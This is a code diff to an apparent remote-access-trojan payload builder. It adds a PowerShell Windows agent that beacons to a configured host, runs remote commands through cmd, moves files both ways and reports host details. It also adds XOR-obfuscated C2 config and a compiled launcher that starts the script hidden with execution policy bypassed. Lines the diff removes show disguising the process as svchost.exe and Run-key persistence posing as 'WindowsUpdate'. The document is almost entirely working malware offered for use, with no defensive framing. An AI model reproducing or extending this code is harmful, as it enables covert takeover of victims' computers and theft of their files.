@@ -23,15 +23,32 @@ KEY = _DEC[2].encode()
 del _XOR, _RAW, _DEC, _b
 '''
 
+_CONFIG_PS1_PLAIN = '''$IP = "{IP}"
+$PORT = {PORT}
+$KEY = "{KEY}"
+'''
+
+_CONFIG_PS1_XOR = '''$_XOR = 0x{XOR_KEY:02x}
+$_RAW = [System.Convert]::FromBase64String("{CONFIG_B64}")
+$_DEC = [byte[]]($_RAW | %{{ $_ -bxor $_XOR }})
+$_STR = [System.Text.Encoding]::UTF8.GetString($_DEC).Split("|")
+$IP = $_STR[0]
+$PORT = [int]$_STR[1]
+$KEY = $_STR[2]
+Remove-Variable _XOR, _RAW, _DEC, _STR
+'''
+
 AGENT_LINUX_TEMPLATE = '''#!/usr/bin/env python3
 import base64 as _b64
+import hmac as _hmac
 import os
 import socket
 import subprocess
 import sys
 import time
 
-from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import padding as _pad
+from cryptography.hazmat.primitives.ciphers import Cipher as _Cipher, algorithms as _alg, modes as _mod
 
 # ---------- config ----------
 {CONFIG_BLOCK}
@@ -40,10 +57,27 @@ from cryptography.fernet import Fernet
 def _enc(data):
     if isinstance(data, str):
         data = data.encode()
-    return Fernet(KEY).encrypt(data)
+    raw = _b64.urlsafe_b64decode(KEY)
+    ak, hk = raw[:16], raw[16:32]
+    iv = os.urandom(16)
+    p = _pad.PKCS7(128).padder()
+    padded = p.update(data) + p.finalize()
+    c = _Cipher(_alg.AES(ak), _mod.CBC(iv)).encryptor()
+    ct = c.update(padded) + c.finalize()
+    sig = _hmac.new(hk, iv + ct, "sha256").digest()
+    return sig + iv + ct
 
 def _dec(data):
-    return Fernet(KEY).decrypt(data)
+    raw = _b64.urlsafe_b64decode(KEY)
+    ak, hk = raw[:16], raw[16:32]
+    sig, iv, ct = data[:32], data[32:48], data[48:]
+    exp = _hmac.new(hk, iv + ct, "sha256").digest()
+    if not _hmac.compare_digest(sig, exp):
+        raise ValueError("bad hmac")
+    c = _Cipher(_alg.AES(ak), _mod.CBC(iv)).decryptor()
+    padded = c.update(ct) + c.finalize()
+    u = _pad.PKCS7(128).unpadder()
+    return u.update(padded) + u.finalize()
 
 def _send(s, data):
     if isinstance(data, str):
@@ -225,205 +259,178 @@ if __name__ == "__main__":
     _connect()
 '''
 
-AGENT_WINDOWS_TEMPLATE = '''#!/usr/bin/env python3
-import base64 as _b64
-import ctypes
-import os
-import socket
-import subprocess
-import sys
-import time
+AGENT_WINDOWS_PS1_TEMPLATE = '''{CONFIG_BLOCK}
 
-from cryptography.fernet import Fernet
+$C = "Entropy"
+$KEY = $KEY.Replace('-', '+').Replace('_', '/')
 
-# ---------- config ----------
-{CONFIG_BLOCK}
+Write-Host "[$C] Starting agent... key length=$($KEY.Length)" -ForegroundColor Cyan
 
-# ---------- crypto ----------
-def _enc(data):
-    if isinstance(data, str):
-        data = data.encode()
-    return Fernet(KEY).encrypt(data)
+function _enc($d) {
+    Write-Host "[$C] _enc: $d" -ForegroundColor DarkGray
+    $r = [System.Convert]::FromBase64String($KEY)
+    Write-Host "[$C] _enc: key decoded ($($r.Length) bytes)" -ForegroundColor DarkGray
+    $ak = [byte[]]$r[0..15]; $hk = [byte[]]$r[16..31]
+    Write-Host "[$C] _enc: aesKey=$($ak.Length) hmacKey=$($hk.Length)" -ForegroundColor DarkGray
+    $b = [System.Text.Encoding]::UTF8.GetBytes($d)
+    $a = [System.Security.Cryptography.Aes]::Create()
+    $a.KeySize = 128; $a.Key = $ak; $a.GenerateIV()
+    $iv = $a.IV; $ct = $a.CreateEncryptor().TransformFinalBlock($b, 0, $b.Length)
+    $a.Dispose()
+    Write-Host "[$C] _enc: iv=$($iv.Length) ct=$($ct.Length)" -ForegroundColor DarkGray
+    $h = [System.Security.Cryptography.HMACSHA256]::new($hk)
+    $s = $h.ComputeHash([byte[]]($iv + $ct)); $h.Dispose()
+    Write-Host "[$C] _enc: sig=$($s.Length)" -ForegroundColor DarkGray
+    return [byte[]]($s + $iv + $ct)
+}
 
-def _dec(data):
-    return Fernet(KEY).decrypt(data)
+function _dec($d) {
+    Write-Host "[$C] _dec: $($d.Length) bytes" -ForegroundColor DarkGray
+    $r = [System.Convert]::FromBase64String($KEY)
+    $ak = [byte[]]$r[0..15]; $hk = [byte[]]$r[16..31]
+    $s = [byte[]]$d[0..31]; $iv = [byte[]]$d[32..47]; $ct = [byte[]]$d[48..($d.Length-1)]
+    Write-Host "[$C] _dec: sig=$($s.Length) iv=$($iv.Length) ct=$($ct.Length)" -ForegroundColor DarkGray
+    $h = [System.Security.Cryptography.HMACSHA256]::new($hk)
+    $ex = $h.ComputeHash([byte[]]($iv + $ct)); $h.Dispose()
+    Write-Host "[$C] _dec: verifying HMAC..." -ForegroundColor DarkGray
+    for ($i=0; $i -lt 32; $i++) { if ($s[$i] -ne $ex[$i]) { Write-Host "[$C] _dec: HMAC MISMATCH at byte $i" -ForegroundColor Red; return $null } }
+    $a = [System.Security.Cryptography.Aes]::Create()
+    $a.KeySize = 128; $a.Key = $ak; $a.IV = $iv
+    $pt = $a.CreateDecryptor().TransformFinalBlock($ct, 0, $ct.Length)
+    $a.Dispose()
+    $result = [System.Text.Encoding]::UTF8.GetString($pt)
+    Write-Host "[$C] _dec: OK -> $result" -ForegroundColor DarkGray
+    return $result
+}
 
-def _send(s, data):
-    if isinstance(data, str):
-        data = data.encode()
-    p = _enc(data)
-    s.sendall(len(p).to_bytes(4, "big") + p)
+function _send($s, $d) {
+    Write-Host "[$C] _send: $d" -ForegroundColor DarkGray
+    $e = _enc $d
+    Write-Host "[$C] _send: encrypted $($e.Length) bytes" -ForegroundColor DarkGray
+    $h = [System.BitConverter]::GetBytes($e.Length)
+    [Array]::Reverse($h)
+    $s.Write($h, 0, 4); $s.Write($e, 0, $e.Length)
+    Write-Host "[$C] _send: written" -ForegroundColor DarkGray
+}
 
-def _recv(s):
-    h = s.recv(4)
-    if not h:
-        return None
-    n = int.from_bytes(h, "big")
-    d = b""
-    while len(d) < n:
-        c = s.recv(n - len(d))
-        if not c:
-            return None
-        d += c
-    return _dec(d)
+function _recv($s) {
+    Write-Host "[$C] _recv: waiting for header..." -ForegroundColor DarkGray
+    $h = [byte[]]::new(4); $r = 0
+    while ($r -lt 4) { $n = $s.Read($h, $r, 4 - $r); if ($n -le 0) { return $null }; $r += $n }
+    [Array]::Reverse($h); $l = [System.BitConverter]::ToInt32($h, 0)
+    Write-Host "[$C] _recv: expecting $l bytes" -ForegroundColor DarkGray
+    $d = [byte[]]::new($l); $r = 0
+    while ($r -lt $l) { $n = $s.Read($d, $r, $l - $r); if ($n -le 0) { return $null }; $r += $n }
+    Write-Host "[$C] _recv: got $($d.Length) bytes, decrypting..." -ForegroundColor DarkGray
+    return _dec $d
+}
 
-# ---------- stealth ----------
-def _stealth():
-    try:
-        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
-    except Exception:
-        try:
-            sys.argv[0] = "svchost.exe"
-        except Exception:
-            pass
+function _special($s, $cmd) {
+    if ($cmd -eq "__ping__") { Write-Host "[$C] CMD: ping" -ForegroundColor Yellow; _send $s "__pong__"; return $true }
+    if ($cmd -like "__download__|*") {
+        Write-Host "[$C] CMD: download" -ForegroundColor Yellow
+        $p = $cmd.Substring(13)
+        try { $b = [System.IO.File]::ReadAllBytes($p); _send $s ([System.Convert]::ToBase64String($b)) }
+        catch { _send $s "__error__|$($_.Exception.Message)" }
+        return $true
+    }
+    if ($cmd -like "__upload__|*") {
+        Write-Host "[$C] CMD: upload" -ForegroundColor Yellow
+        $parts = $cmd.Split("|", 3)
+        if ($parts.Length -lt 3) { _send $s "__error__|invalid format"; return $true }
+        try {
+            $b = [System.Convert]::FromBase64String($parts[2])
+            $dir = [System.IO.Path]::GetDirectoryName($parts[1])
+            if ($dir) { [System.IO.Directory]::CreateDirectory($dir) | Out-Null }
+            [System.IO.File]::WriteAllBytes($parts[1], $b)
+            _send $s "__ok__|$($b.Length) bytes"
+        } catch { _send $s "__error__|$($_.Exception.Message)" }
+        return $true
+    }
+    if ($cmd -eq "__selfdestruct__") {
+        Write-Host "[$C] CMD: selfdestruct" -ForegroundColor Red
+        $k = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        try { Remove-ItemProperty -Path $k -Name "WindowsUpdate" -ErrorAction SilentlyContinue } catch {}
+        try { Remove-Item -Path $PSCommandPath -Force -ErrorAction SilentlyContinue } catch {}
+        _send $s "__selfdestruct__ok__"
+        $s.Close(); $client.Close(); exit
+    }
+    if ($cmd -eq "__info__") {
+        Write-Host "[$C] CMD: info" -ForegroundColor Yellow
+        $i = "$([Environment]::OSVersion.Platform)|$([Environment]::OSVersion.Version.ToString())|$((Get-Location).Path)|$([Environment]::GetFolderPath('UserProfile'))|$([Environment]::UserName)|$([System.Net.Dns]::GetHostName())|$([Guid]::NewGuid().ToString())"
+        _send $s $i; return $true
+    }
+    return $false
+}
 
-# ---------- persistence ----------
-def _persist():
-    try:
-        p = os.path.abspath(sys.argv[0])
-        k = r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-        v = '"' + sys.executable + '" "' + p + '"'
-        subprocess.run(
-            ["reg", "add", k, "/v", "WindowsUpdate", "/d", v, "/f"],
-            capture_output=True, stderr=subprocess.DEVNULL,
-        )
-    except Exception:
-        pass
-
-def _remove_persist():
-    try:
-        k = r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-        subprocess.run(
-            ["reg", "delete", k, "/v", "WindowsUpdate", "/f"],
-            capture_output=True, stderr=subprocess.DEVNULL,
-        )
-    except Exception:
-        pass
-
-# ---------- command handler ----------
-def _special(cmd, s):
-    if cmd == "__ping__":
-        _send(s, "__pong__")
-        return True
-
-    if cmd.startswith("__download__|"):
-        path = cmd[13:]
-        try:
-            with open(path, "rb") as f:
-                b = _b64.b64encode(f.read()).decode()
-            _send(s, b)
-        except Exception as e:
-            _send(s, "__error__|" + str(e))
-        return True
-
-    if cmd.startswith("__upload__|"):
-        parts = cmd.split("|", 2)
-        if len(parts) < 3:
-            _send(s, "__error__|invalid format")
-            return True
-        try:
-            raw = _b64.b64decode(parts[2])
-            d = os.path.dirname(parts[1])
-            if d:
-                os.makedirs(d, exist_ok=True)
-            with open(parts[1], "wb") as f:
-                f.write(raw)
-            _send(s, "__ok__|" + str(len(raw)) + " bytes")
-        except Exception as e:
-            _send(s, "__error__|" + str(e))
-        return True
-
-    if cmd == "__selfdestruct__":
-        _remove_persist()
-        try:
-            os.remove(sys.argv[0])
-        except Exception:
-            pass
-        _send(s, "__selfdestruct__ok__")
-        s.close()
-        sys.exit(0)
-
-    if cmd == "__info__":
-        import uuid
-        i = "|".join([
-            sys.platform,
-            os.name,
-            os.getcwd(),
-            os.path.expanduser("~"),
-            os.getenv("USERNAME", "unknown"),
-            socket.gethostname(),
-            str(uuid.uuid4()),
-        ])
-        _send(s, i)
-        return True
-
-    return False
-
-# ---------- connect ----------
-def _connect():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(60)
-            s.connect((IP, PORT))
-            _send(s, "beacon")
-            while True:
-                try:
-                    d = _recv(s)
-                    if d is None:
-                        break
-                    cmd = d.decode()
-                    if _special(cmd, s):
-                        continue
-                    r = subprocess.run(
-                        ["cmd.exe", "/c", cmd],
-                        capture_output=True,
-                        timeout=60,
-                        creationflags=0x08000000,
-                    )
-                    out = r.stdout + r.stderr
-                    if not out:
-                        out = b"[OK]\\r\\n"
-                    _send(s, out)
-                except subprocess.TimeoutExpired:
-                    try:
-                        _send(s, "[!] timeout")
-                    except Exception:
-                        pass
-                    break
-                except Exception:
-                    break
-            s.close()
-        except Exception:
-            pass
-        time.sleep(30)
-
-if __name__ == "__main__":
-    _stealth()
-    _persist()
-    _connect()
-'''
+while ($true) {
+    Write-Host "[$C] Connecting to $($IP):$($PORT)..." -ForegroundColor Cyan
+    try {
+        $client = New-Object System.Net.Sockets.TcpClient
+        $client.ReceiveTimeout = 60000
+        $client.SendTimeout = 30000
+        $client.Connect($IP, $PORT)
+        Write-Host "[$C] Connected! Getting stream..." -ForegroundColor Green
+        $s = $client.GetStream()
+        Write-Host "[$C] Sending beacon..." -ForegroundColor Green
+        _send $s "beacon"
+        Write-Host "[$C] Beacon sent, waiting for commands..." -ForegroundColor Green
+        while ($true) {
+            $cmd = _recv $s
+            if ($cmd -eq $null) {
+                Write-Host "[$C] Connection closed" -ForegroundColor Red
+                break
+            }
+            Write-Host "[$C] Received command: '$cmd'" -ForegroundColor Yellow
+            if (_special $s $cmd) { continue }
+            Write-Host "[$C] Executing: $cmd" -ForegroundColor Yellow
+            try {
+                $out = & cmd /c $cmd 2>&1
+                if ($out) { $out = ($out | Out-String) } else { $out = "[OK]`r`n" }
+                _send $s $out
+            } catch { _send $s "[!] $($_.Exception.Message)" }
+        }
+        $s.Close(); $client.Close()
+        Write-Host "[$C] Disconnected, reconnecting in 30s..." -ForegroundColor Cyan
+    } catch {
+        Write-Host "[$C] ERROR: $_" -ForegroundColor Red
+        try { $s.Close() } catch {}
+        try { $client.Close() } catch {}
+    }
+    Start-Sleep -Seconds 30
+}'''
 
 
-def _build_config_block(ip, port, key_str, obfuscation):
-    if obfuscation == "xor":
-        xor_key = random.randint(1, 254)
-        config_str = f"{ip}|{port}|{key_str}"
-        obf = bytes(b ^ xor_key for b in config_str.encode())
-        config_b64 = base64.b64encode(obf).decode()
-        return _CONFIG_XOR.format(XOR_KEY=xor_key, CONFIG_B64=config_b64), True
+def _build_config_block(ip, port, key_str, obfuscation, ps1=False):
+    if ps1:
+        if obfuscation == "xor":
+            xor_key = random.randint(1, 254)
+            config_str = f"{ip}|{port}|{key_str}"
+            obf = bytes(b ^ xor_key for b in config_str.encode())
+            config_b64 = base64.b64encode(obf).decode()
+            return _CONFIG_PS1_XOR.format(XOR_KEY=xor_key, CONFIG_B64=config_b64)
+        else:
+            return _CONFIG_PS1_PLAIN.format(IP=ip, PORT=port, KEY=key_str)
     else:
-        return _CONFIG_PLAIN.format(IP=ip, PORT=port, KEY=key_str), False
+        if obfuscation == "xor":
+            xor_key = random.randint(1, 254)
+            config_str = f"{ip}|{port}|{key_str}"
+            obf = bytes(b ^ xor_key for b in config_str.encode())
+            config_b64 = base64.b64encode(obf).decode()
+            return _CONFIG_XOR.format(XOR_KEY=xor_key, CONFIG_B64=config_b64)
+        else:
+            return _CONFIG_PLAIN.format(IP=ip, PORT=port, KEY=key_str)
 
 
 def _generate_agent_code(ip, port, os_type, key, obfuscation):
     key_str = key.decode()
-    config_block, is_obf = _build_config_block(ip, port, key_str, obfuscation)
 
-    if os_type == "linux":
-        code = AGENT_LINUX_TEMPLATE.replace("{CONFIG_BLOCK}", config_block)
+    if os_type == "windows":
+        config_block = _build_config_block(ip, port, key_str, obfuscation, ps1=True)
+        code = AGENT_WINDOWS_PS1_TEMPLATE.replace("{CONFIG_BLOCK}", config_block)
     else:
-        code = AGENT_WINDOWS_TEMPLATE.replace("{CONFIG_BLOCK}", config_block)
+        config_block = _build_config_block(ip, port, key_str, obfuscation, ps1=False)
+        code = AGENT_LINUX_TEMPLATE.replace("{CONFIG_BLOCK}", config_block)
 
     return code
 
@@ -519,9 +526,9 @@ def _escape_c_string(text):
     return r
 
 
-def compile_windows_mingw(py_path, output_dir="payloads", verbose=True):
+def compile_windows_mingw(ps1_path, output_dir="payloads", verbose=True):
     """Cross-compile a Windows .exe from Linux using mingw-w64.
-    Embeds the Python script in a C launcher and compiles to a native PE."""
+    Embeds the PowerShell script in a C launcher and compiles to a native PE."""
     mingw = shutil.which("x86_64-w64-mingw32-gcc")
     if not mingw:
         if verbose:
@@ -529,17 +536,17 @@ def compile_windows_mingw(py_path, output_dir="payloads", verbose=True):
             print("      Install: sudo apt install mingw-w64")
         return None
 
-    name = os.path.splitext(os.path.basename(py_path))[0]
+    name = os.path.splitext(os.path.basename(ps1_path))[0]
 
     try:
-        with open(py_path, "r") as f:
-            py_code = f.read()
+        with open(ps1_path, "r") as f:
+            ps_code = f.read()
     except Exception as e:
         if verbose:
-            print(f"  [!] Failed to read {py_path}: {e}")
+            print(f"  [!] Failed to read {ps1_path}: {e}")
         return None
 
-    escaped = _escape_c_string(py_code)
+    escaped = _escape_c_string(ps_code)
 
     c_src = (
         '#include <windows.h>\n'
@@ -548,7 +555,7 @@ def compile_windows_mingw(py_path, output_dir="payloads", verbose=True):
         'int WINAPI WinMain(HINSTANCE h,HINSTANCE hp,LPSTR lp,int ns){\n'
         'char t[MAX_PATH],p[MAX_PATH],c[1024];DWORD n;\n'
         'GetTempPathA(sizeof(t),t);\n'
-        'snprintf(p,sizeof(p),"%se.py",t);\n'
+        'snprintf(p,sizeof(p),"%se.ps1",t);\n'
         'HANDLE f=CreateFileA(p,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,'
         'FILE_ATTRIBUTE_NORMAL,NULL);\n'
         'if(!f)return 1;\n'
@@ -556,7 +563,7 @@ def compile_windows_mingw(py_path, output_dir="payloads", verbose=True):
         'CloseHandle(f);\n'
         'STARTUPINFOA si={0};PROCESS_INFORMATION pi={0};\n'
         'si.cb=sizeof(si);si.dwFlags=STARTF_USESHOWWINDOW;si.wShowWindow=SW_HIDE;\n'
-        'snprintf(c,sizeof(c),"python \\"%s\\"",p);\n'
+        'snprintf(c,sizeof(c),"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \\"%s\\"",p);\n'
         'CreateProcessA(NULL,c,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);\n'
         'CloseHandle(pi.hProcess);CloseHandle(pi.hThread);\n'
         'return 0;\n'
@@ -613,19 +620,25 @@ def generate_payload(ip, port, os_type="linux", key=None, obfuscation="none", co
     if obfuscation not in ("none", "xor", "packed"):
         obfuscation = "none"
 
-    prefix = "agent_linux" if os_type == "linux" else "agent_windows"
+    is_win = os_type == "windows"
+    prefix = "agent_windows" if is_win else "agent_linux"
+    ext = ".ps1" if is_win else ".py"
     safe_ip = ip.replace(".", "_").replace(":", "_")
 
     if name:
-        filename = name if name.endswith(".py") else name + ".py"
+        filename = name if name.endswith(ext) else name + ext
     elif obfuscation == "packed":
-        plain_code = _generate_agent_code(ip, port, os_type, key, "none")
-        code = obfuscate_packed(plain_code)
-        filename = f"{prefix}_{safe_ip}_{port}_packed.py"
+        if is_win:
+            code = _generate_agent_code(ip, port, os_type, key, obfuscation)
+            filename = f"{prefix}_{safe_ip}_{port}_packed.ps1"
+        else:
+            plain_code = _generate_agent_code(ip, port, os_type, key, "none")
+            code = obfuscate_packed(plain_code)
+            filename = f"{prefix}_{safe_ip}_{port}_packed.py"
     else:
         code = _generate_agent_code(ip, port, os_type, key, obfuscation)
         suffix = "_obf" if obfuscation == "xor" else ""
-        filename = f"{prefix}_{safe_ip}_{port}{suffix}.py"
+        filename = f"{prefix}_{safe_ip}_{port}{suffix}{ext}"
 
     os.makedirs(output_dir, exist_ok=True)
     filepath = os.path.join(output_dir, filename)
@@ -633,20 +646,21 @@ def generate_payload(ip, port, os_type="linux", key=None, obfuscation="none", co
     with open(filepath, "w") as f:
         f.write(code)
 
-    os.chmod(filepath, 0o755)
+    if not is_win:
+        os.chmod(filepath, 0o755)
 
     exe_path = None
     if compile_exe:
         host = sys.platform.lower()
         on_linux = not host.startswith("win")
 
-        if os_type == "windows" and on_linux:
+        if is_win and on_linux:
             print("  [*] Cross-compiling Windows .exe with mingw-w64...")
             exe_path = compile_windows_mingw(filepath, output_dir)
-        elif os_type == "linux" and on_linux:
+        elif not is_win and on_linux:
             print("  [*] Compiling Linux binary with PyInstaller...")
             exe_path = try_compile_exe(filepath, output_dir)
-        elif os_type == "windows" and not on_linux:
+        elif is_win and not on_linux:
             print("  [*] Compiling Windows .exe with PyInstaller...")
             exe_path = try_compile_exe(filepath, output_dir)
         else:
